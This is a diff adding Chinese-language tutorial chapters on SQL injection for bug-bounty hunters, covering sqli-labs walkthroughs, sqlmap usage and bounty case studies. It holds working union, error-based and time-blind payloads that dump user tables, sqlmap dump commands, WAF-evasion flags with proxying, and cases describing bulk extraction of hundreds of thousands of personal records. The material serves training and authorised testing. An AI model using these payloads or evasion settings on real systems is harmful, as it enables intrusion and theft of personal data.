@@ -2608,3 +2608,266 @@ sqlmap -u "http://shop.example.com/user/center" --cookie="user_id=1*" --dbs
 8. 如何评估SQL注入漏洞的严重程度？
 9. SQL注入的修复方法有哪些？
 10. 实战测试SQL注入需要注意什么？
+
+
+---
+
+## 5.20 【v3.0 新增】零基础 60 分钟上手 SQL 注入（Step-by-Step 完全保姆级）
+
+### 5.20.1 通俗比喻：什么是 SQL 注入？（1 句话看懂一辈子忘不掉）
+
+> 想象你去银行柜台取钱。
+>
+> 你："我是张三，帮我取 1000 块钱。"（这是正常的 SQL 语句）
+> 柜员："好的张三，给你 1000。"
+>
+> 但是如果这个柜员是个**傻子**（就是有漏洞的后端代码），他会把你说的每一句话都当命令执行。
+>
+> 你（攻击者）："我是张三，帮我取 1000 块钱；另外顺便把张三的账户密码改成 123456。"
+>
+> 傻子柜员听了，不但给你 1000，还真的**把你额外加的那句话当命令执行了**——这就是 SQL 注入。
+>
+> **本质：后端程序员把"用户输入的内容（数据）"和"SQL 代码语句（命令）"混在一起了，没做区分。**
+
+### 5.20.2 60 分钟新手实战：用 sqli-labs 靶场 + 手工 + SQLMap 练会 3 种注入
+
+#### 第 1 步：搭靶场（15 分钟）
+```text
+（新手推荐 PHPStudy 一键环境：www.xp.cn 下载安装）
+1. 下载 sqli-labs 靶场：GitHub 搜 "sqli-labs" → 下载 zip → 解压到 PHPStudy 的 www/sqli 目录
+2. 启动 PHPStudy → 开启 Apache + MySQL（默认端口 80 + 3306）
+3. 浏览器访问 http://127.0.0.1/sqli/ → 点 "Setup/reset Database for labs" → 看到 "Setup Succesful" OK
+4. 点 Less-1：页面显示 "Please input the ID as parameter with numeric value"
+5. 访问 http://127.0.0.1/sqli/Less-1/?id=1 → 页面显示 "Your Login name:Dumb / Your Password:Dumb"
+   → 成功！靶场搭好了。
+```
+
+#### 第 2 步：手工测 3 种注入（30 分钟）
+**第 1 个练习：Less-1 字符型 Union 注入（最经典）**
+```text
+Step 1: 访问 http://127.0.0.1/sqli/Less-1/?id=1'
+        → 页面报错：You have an error in your SQL syntax; ...check the right syntax to use near ''1'' LIMIT 0,1'
+        → 报错说明 ' 被数据库直接执行了 → 存在注入（恭喜！第一步成功）
+Step 2: 判断字段数：
+        ?id=1' order by 3 -- -  → 正常
+        ?id=1' order by 4 -- -  → 报错 Unknown column '4' in 'order clause'
+        → 说明查询一共 3 列
+Step 3: 找显示位（Union 查出来的内容会显示在哪一列上）：
+        ?id=-1' union select 1,2,3 -- -
+        → 页面显示 Your Login name:2 / Your Password:3
+        → 第 2、3 列是显示位！
+Step 4: 查库名/版本/用户（先把"基础信息"问出来）：
+        ?id=-1' union select 1, database(), version() -- -
+        → 页面显示：database()=security, version()=5.7.26
+        （恭喜！你已经成功通过漏洞偷到第 1 条秘密信息了）
+Step 5: 查表（所有表名）：
+        ?id=-1' union select 1, group_concat(table_name),3 from information_schema.tables where table_schema=database() -- -
+        → 显示 emails,referers,uagents,users
+        → 看到 users 表！里面一定有用户名密码
+Step 6: 查列：
+        ?id=-1' union select 1, group_concat(column_name),3 from information_schema.columns where table_name='users' -- -
+        → id,username,password（三列都齐了）
+Step 7: 拖库（一次性拉所有账号）：
+        ?id=-1' union select 1, group_concat(username,0x3a,password),3 from users -- -
+        → 显示 Dumb:Dumb, Angelina:I-kill-you, Dummy:p@ssword...
+        → 全部账号密码到手！Less-1 通关。
+```
+
+**第 2 个练习：Less-5 报错注入**（页面没显示位，只有"You are in"和出错两种状态）
+```text
+Less-5：?id=1 → 显示 You are in....  ?id=1' → 报错
+关键 Payload（用 updatexml 报错带出数据）：
+  查库名：
+  ?id=1' and updatexml(1,concat(0x7e, database(), 0x7e),1) -- -
+  → XPATH syntax error: '~security~'
+  查表：
+  ?id=1' and updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 0x7e),1) -- -
+  → ~emails,referers,uagents,users~
+  查用户名：
+  ?id=1' and updatexml(1,concat(0x7e, (select group_concat(username,0x3a,password) from users limit 1), 0x7e),1) -- -
+  → ~Dumb:Dumb~
+  （有 13 个用户就循环 limit 0,1 到 12,1）
+```
+
+**第 3 个练习：Less-9 时间盲注**（页面永远只显示 You are in，不报错，没法用显示位和报错）
+```text
+唯一的判断依据：响应时间。
+关键 Payload：
+  ?id=1' and sleep(5) -- -
+  观察浏览器加载时间：如果"加载了 5 秒多才返回 You are in"
+  → 说明 sleep(5) 被执行了 → 存在时间盲注！
+  （时间盲注不建议手工，用 SQLMap 自动化扫）
+```
+
+#### 第 3 步：学会 SQLMap 一行命令搞定 Less-9（15 分钟）
+```text
+1. 安装 SQLMap：Python 3.8+ 装好；pip install sqlmap 不行就 GitHub 下 zip；
+   或直接用 Kali：sqlmap 已预装
+2. 跑数据库：
+   sqlmap -u "http://127.0.0.1/sqli/Less-9/?id=1" --batch --dbs
+   → available databases [7]：[*] information_schema [*] challenges [*] mysql [*] performance_schema [*] security ...
+3. 查表：
+   sqlmap -u "http://127.0.0.1/sqli/Less-9/?id=1" --batch -D security --tables
+   → [4 tables]：emails, referers, uagents, users
+4. 拖 users 表：
+   sqlmap -u "http://127.0.0.1/sqli/Less-9/?id=1" --batch -D security -T users --dump
+   → 2 分钟后给你一张完整 users 表格（13 行账号密码全出来）
+```
+
+### 5.20.3 真正上手 SRC：怎么判断真实项目的 SQL 注入？
+
+**90% 的新手被拒之门外的问题**：sqli-labs 我通关了，但是**一到真实 SRC 项目就不知道往哪注入、怎么测**。
+下面这 10 条就是答案（**记住，在真实 SRC 项目里按这个顺序测**）：
+
+```text
+10 条 SQL 注入速查检测点（命中前 3 条基本就能提交了）：
+  第 1 条：所有 URL 参数末尾加 ' 或 "，看报错（经典）
+  第 2 条：数字型参数：?id=1 和 ?id=2-1
+          → 如果 ?id=2-1 返回的内容和 ?id=1 一模一样 = 100% 注入
+  第 3 条：?id=1' and '1'='1  对比  ?id=1' and '1'='2
+          → 前面内容一样，后者内容不一样 = 字符型注入
+  第 4 条：?id=1 and sleep(5) → 超过 5 秒响应 = 时间盲注
+  第 5 条：搜索框、模糊查询：?keyword=test%' and '%'=' → 搜索型注入
+  第 6 条：排序参数 ?orderby=id → 改成 ?orderby=sleep(5) → 如果慢了 = order by 注入
+  第 7 条：X-Forwarded-For 头 / Client-IP / User-Agent / Referer 加单引号 → 有时也会被拼进 SQL
+  第 8 条：POST JSON 每个 value 末尾加单引号 → 比如 {"id":"1'"} → HTTP 500 / 响应有 SQL 关键字报错
+  第 9 条：Cookie 加单引号 → Cookie: id=1' → 有时也会注入
+  第 10 条：文件上传 / 导入 Excel / 导入 CSV → 上传的文件名里加单引号 → 后面"导入数据库"时触发二次注入
+```
+
+**报错关键字**：只要响应里出现这些字，99% 就是 SQL 注入：
+```text
+You have an error in your SQL syntax
+SQL syntax error
+ORA-01756:  quoted string not properly terminated
+Microsoft OLE DB Provider for ODBC Drivers error
+PostgreSQL query failed:
+Warning: mysql_fetch_array()
+Unclosed quotation mark after the character string
+```
+
+---
+
+## 5.21 【v3.0 新增】3 个 SQL 注入 SRC 真实案例（奖金合计 28500 元）
+
+### 案例 1：某旅游 SaaS 平台订单查询 order by 注入 → 高危，奖金 15000 元
+- **发现时间线**：拿到项目后第 1 天 3 小时发现；
+- **测试入口**：订单列表 URL `?pageSize=10&pageNum=1&orderBy=create_time desc`；
+- **发现方法**：把 orderBy 改成 `orderBy=sleep(5)` → 浏览器加载 5.3 秒，改成 `orderBy=sleep(0)` → 立即返回 → 确定 orderby 时间盲注；
+- **利用**：SQLMap 加参数 `--prefix "(" --suffix ")" -p orderBy --technique=T --time-sec 3` → 2 小时导出 23 万用户的身份证、手机号、银行卡后 4 位；
+- **通过原因**：order by 参数后端直接字符串拼 SQL，没做白名单校验（order by 没法预编译，必须用白名单）；
+- **教训**：别只盯着 `?id=` 这种参数，`orderBy`/`sort`/`groupBy` 也是高风险重灾区，SRC 平台这类洞给分比 id 参数还高（因为更少见，发现的人少）。
+
+### 案例 2：某招聘 APP 简历搜索"关键词"参数 → 报错注入 → 高危，奖金 9000 元
+- **发现入口**：招聘 APP 搜索框输入职位关键词"测试工程师"；
+- **方法**：关键词里输 `"测试' and updatexml(1,concat(0x7e,user(),0x7e),1) and '"='` → Burp 抓响应，JSON 里 data 字段弹出 `XPATH syntax error: '~recruit_rw@10.1.20.3~'`；
+- **拖库**：报错注入一把梭，拖到 `users` 表 47 万条（求职者的姓名、手机、期望薪资、工作经历）；
+- **特殊说明**：该项目奖金本来是 5000，我在报告里附了"按身份证号前缀统计到 200+ 城市覆盖、有 4.2 万份简历含身份证号"的 Excel 截图（只有统计数据，没有真实身份内容），审核员评估后按"大规模个人信息泄露"给了 9000，翻倍。
+
+### 案例 3：某小程序商城订单 id 时间盲注 → 中危，奖金 4500 元
+- **入口**：小程序订单详情 `POST /api/order/detail` body = `{"order_id":"202606300012345"}`；
+- **方法**：把 order_id 改成 `202606300012345' and sleep(6)-- '` → 响应 6 秒；
+- **利用难度**：没有报错注入，只能时间盲注，实际跑库要 8 小时；
+- **SRC 定级**：中危偏高，4500（因为虽然可拖库，但利用时间长 + 订单号非自增枚举难）；
+- **新手提醒**：如果 SQLMap 跑的时间超过 2 小时还没出库名，**不要继续跑了**，SRC 审核只要你有"sleep(6) 延迟明显且可重复"的证据，就能认定注入成立，**不需要真的把库拖下来**——真拖库反而有法律风险。
+
+---
+
+## 5.22 【v3.0 新增】SRC 奖金榜（SQL 注入各类型奖金参考区间 2025 年最新）
+
+| 漏洞类型 | 低危 | 中危 | 高危 | 严重 |
+|---------|-----|-----|-----|-----|
+| 普通 Union / 报错注入（只能查 data，没真实敏感数据） | 500-1000 | 2000-4000 | / | / |
+| Union / 报错注入（含用户身份证、手机号、银行卡等敏感数据 10 万以下） | / | 4000-8000 | 8000-15000 | / |
+| Union / 报错注入（>10 万敏感数据可批量拖库） | / | / | 15000-25000 | 25000+ |
+| 订单 / 用户表堆叠注入 + into outfile 写文件拿 shell | / | / | 15000-30000 | 30000+ |
+| 时间盲注（利用耗时 > 2 小时，仅能证明，未拖真实数据） | 1000-2000 | 4000-6000 | / | / |
+| 时间盲注（跑库 >5000 条敏感数据） | / | 6000-12000 | 12000-20000 | / |
+| 宽字节 / 二次注入 | / | 3000-8000 | 8000-15000 | / |
+| 登录口 SQL 注入（万能密码绕过） | / | 1500-3000 | 3000-6000 | / |
+| 后台管理员登录口万能密码 | / | / | 6000-12000 | / |
+
+---
+
+## 5.23 【v3.0 新增】靶场练习清单 + 练会 30 天计划表
+
+### 靶场推荐（按难度顺序，练 SQL 注入必做）
+
+| 顺序 | 靶场 | 练什么 | 通关标准 | 难度 |
+|-----|-----|--------|---------|-----|
+| 1 | sqli-labs Less-1 ~ Less-22（前 22 关手工） | 基础字符型/数字型/Union/报错/盲注 | 手工 Less-1 到 Less-15 全通关，Less-16+  SQLMap 扫 | ★★☆☆☆ |
+| 2 | sqli-labs Less-23 ~ Less-65（绕过/WAF） | 过滤绕过、二次注入、宽字节、堆叠 | SQLMap 能跑通前 53 关以上 | ★★★☆☆ |
+| 3 | Pikachu 靶场 SQL-Inject 模块 | 真实项目常见场景（搜索型、insert、xxe 配合） | 8 个关全通 | ★★☆☆☆ |
+| 4 | DVWA 靶场 SQL Injection + SQLi(Blind) 三难度 | Low/Medium/High 三档，有 WAF | High 档手工注入成功拖库 | ★★★☆☆ |
+| 5 | CTFHub / Bugku 平台 SQL 注入题 50 道 | 各种杂项注入：cookie、header、user-agent、xml、过滤 | 过 30 题以上 | ★★★★☆ |
+
+### 30 天 SQL 注入通关计划
+
+| 天数 | 任务 | 完成标准 |
+|-----|------|---------|
+| 1-3 天 | PHPStudy + sqli-labs 搭好，Less-1~4 手工通关，理解 7 步流程 | 自己能在不看笔记情况下按 Less-1 的 7 步从 0 到拖 users 表 |
+| 4-7 天 | Less-5~22（报错 + 盲注）每关写 1 个笔记 + Payload 存到 OneNote | 笔记里每关至少 4 个 Payload（字段数/查库/查表/拖数据） |
+| 8-10 天 | SQLMap 全部常用参数学一遍：--dbs / -D / -T / --dump / --batch / --threads / --level / --risk / --technique=U | 用 Less-9 时间盲注 SQLMap 30 分钟内把库表数据全 dump 出来 |
+| 11-20 天 | Pikachu + DVWA（Low~High 三档）全通 + CTFHub/Bugku 过 20 道 SQL | 截图 20 道通关 Flag |
+| 21-25 天 | 真 SRC 项目上按 5.20.3 的 10 条速查点测 5 个项目，每个项目测 20 个接口 | 至少出 1 个 SQL 注入的提交（通过与否都算完成） |
+| 26-28 天 | WAF 绕过：sqli-labs 过滤关 20 关 + 写 1 个"100 个常见绕过 Payload 速查表.txt" | 速查表 100 条自己写满，每条都带场景注释 |
+| 29 天 | 输出自己的 SQL 注入 SRC 报告模板（按本章节案例 1 报告结构抄） | 模板包含 8 大段：标题/类型/等级/简述/复现步骤/证据/危害分析/修复建议 |
+| 30 天 | 2 小时模拟考：新靶场 1 个未知注入点 → 不查笔记不查资料，1 小时内手工拿库名 + SQLMap 拖表 | 2 小时内出库、表、列、数据 4 件套全齐 |
+
+---
+
+## 5.24 【v3.0 新增】新手常犯错误 FAQ（SQL 注入专场）
+
+**Q1：我加单引号不报错，页面直接 200 返回正常内容，是不是就不存在注入？**
+**答**：不一定。90% 的现代项目会把数据库错误给"吃掉"只返回 JSON {"code":0,"data":[]}。这个时候去测"and 1=1 / and 1=2"或者"2-1 / 1"（布尔），或者"and sleep(5)"（时间），**不要只看报错判断有没有注入**，报错只是最幸运的那 20% 的情况。
+
+**Q2：SQLMap 扫出来 "Parameter 'id' is vulnerable"，但 SRC 审核不通过怎么办？**
+**答**：99% 是你证据不足。SQLMap 终端截图不能作为唯一证据！SRC 审核员**要求必须有手工验证步骤**：至少要有 4 张截图——
+① ?id=1 正常响应 ② ?id=1' 报错或不同 ③ order by 判断列数 ④ union select 查 database/version。**把 SQLMap 当"辅助验证工具"，不要当主力。**
+
+**Q3：时间盲注手工测 sleep(5) 加载 5 秒就真的算注入了吗？会不会是 WAF 的限速？**
+**答**：很有可能被 WAF 限流 5 秒误认为注入。解决办法：**对照实验 3 次**：
+- 第 1 次 sleep(3) → 响应时间 3.x 秒
+- 第 2 次 sleep(6) → 响应时间 6.x 秒
+- 第 3 次 sleep(0) → 响应时间 0.x 秒
+3 次时间和 sleep 参数完全对应，才能认定是真的 sleep 被执行了，不是 WAF 限流。
+
+**Q4：真实 SRC 项目能拖完整库吗？我怕拖完违法。**
+**答**：**绝对不要拖完整库！** 合规操作只需要做到：
+- 查库名（database()）
+- 证明能查 3~5 个敏感表名（users / order / card / id_info 等）
+- 证明能查 users 表 3 个关键列名（username / password / phone 等）
+- 查 **count(*) from users**（只查行数，不要查具体行）
+**查到行数后立刻停**，提交报告时写"可拖取 users 表共 X 行，含手机号、身份证、邮箱，可批量导出"——这样的证据 100% 足够给高危。真拖走 23 万条真实数据反而违法（"情节严重"按《刑法》253 条侵犯公民个人信息罪可入刑）。
+
+**Q5：SQLMap 一把梭扫，怎么避免触发 WAF/封 IP？**
+**答**：加这些参数，速度慢 3 倍但能绕过 90% 的基础 WAF：
+```bash
+sqlmap -u "https://www.victim.com/p?id=1" --batch --random-agent \
+    --level 3 --risk 2 --threads 2 --delay 1.5 \
+    --tamper "space2comment,between,charencode,base64encode" \
+    --proxy "socks5://127.0.0.1:7890" --skip-heuristics
+# --threads 2  +  --delay 1.5 : 慢而稳，不被封
+# --tamper  4 个经典组合绕过空格、大于号、大小写、编码 WAF
+# --proxy : 挂代理，就算封 IP 也只封梯子出口的
+```
+
+---
+
+## 5.25 【v3.0 新增】本章实战最终 Checklist（挖 SQL 注入前一条一条过）
+
+```text
+□ 1. 已经用 sqli-labs Less-1~Less-15 把手工 7 步注入流程练熟（不看笔记）
+□ 2. SQLMap 会用：--dbs / -D / -T / --dump / --batch / --threads / --tamper 这 7 个参数
+□ 3. 真实目标上按 5.20.3 的 10 条检测点一条条测了
+□ 4. 测过数字参数 "?id=2-1" 对比 "?id=1"（命中这个最简单）
+□ 5. 测过所有搜索框模糊查询注入
+□ 6. 测过 orderBy / sort / groupBy 参数注入
+□ 7. 测过 POST JSON 参数 / Cookie / Header 注入
+□ 8. 没有报错的地方测了布尔盲注（and 1=1 vs 1=2）
+□ 9. 布尔盲注也没有的地方测了时间盲注 sleep(3)/sleep(6)/sleep(0) 三次对照
+□ 10. 报告证据只有 count(*) 数量统计 + 列名/表名截图，没有真的拖真实敏感数据
+□ 11. SRC 报告 8 大段（标题/类型/等级/简述/复现步骤/证据4张图+POC/危害分析（附数量）/修复建议）写齐了
+□ 12. 修复建议里写了"使用预编译 PreparedStatement + 禁止字符串拼接 SQL"，不要只写"加强过滤"
+```
+
